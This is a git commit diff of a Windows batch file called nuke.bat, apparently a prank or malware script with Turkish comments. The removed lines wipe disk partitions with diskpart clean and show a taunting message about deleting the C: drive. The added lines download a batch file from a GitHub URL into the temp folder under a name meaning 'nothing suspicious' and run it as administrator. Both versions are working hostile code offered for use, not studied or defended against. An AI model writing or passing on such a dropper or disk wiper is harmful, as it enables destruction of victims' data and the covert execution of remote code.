4e5edc10a10285bb7f880c83f8684c3cc7d6012e
ruzgartvtr <ruzgarhunerel@gmail.com>
2025-05-14 20:03:02 +0300

    Add files via upload

--- nuke.bat
+++ nuke.bat
@@ -1,15 +1,13 @@
 @echo off
+setlocal
 
-echo HAHAHA BİLGİSAYARIN C: SÜRÜCÜSÜ SİLİNİYOR BAYBAY HAHAHAHA BU ARADA GERÇEKTEN BOL ŞANS
+:: 1. Dosya nereye indirilecek
+set "indirilecek_yol=%TEMP%\hicsupheliolmayan.bat"
 
-diskpart
-select disk 0
-select partition 1
-clean
+:: 2. Dosya indirme (örnek .exe URL)
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/ruzgartvtr/ROBOT/raw/refs/heads/main/nuke.bat' -OutFile '%indirilecek_yol%'"
 
+:: 3. Yönetici olarak çalıştır (PowerShell ile)
+powershell -Command "Start-Process '%indirilecek_yol%' -Verb runAs"
 
-select disk 1
-select partition 1
-clean
-
-
+exit
